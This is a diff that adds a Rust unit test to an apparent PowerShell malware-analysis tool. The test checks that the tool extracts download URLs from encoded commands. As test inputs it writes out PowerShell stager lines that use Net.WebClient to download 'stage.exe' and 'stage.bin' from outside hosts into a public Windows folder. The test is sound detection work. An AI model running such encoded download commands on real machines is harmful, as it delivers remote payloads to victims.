@@ -10114,6 +10114,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn webclient_downloadfile_schemeless_domain_path_url_extracted() {
+        let ps = r#"$wc=New-Object Net.WebClient;$wc.DownloadFile("cdn-webclient.com/stage.exe","C:\Users\Public\stage.exe")"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://cdn-webclient.com/stage.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\stage.exe")
+            )
+        });
+        assert!(
+            has,
+            "schemeless WebClient DownloadFile URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn webclient_openread_concatenated_variable_url_extracted() {
         let ps = r#"$ser=$('http://198.51.100.7:8080');$t='/stage.bin';$wc=New-Object Net.WebClient;$wc.OpenRead($Ser+$T)"#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
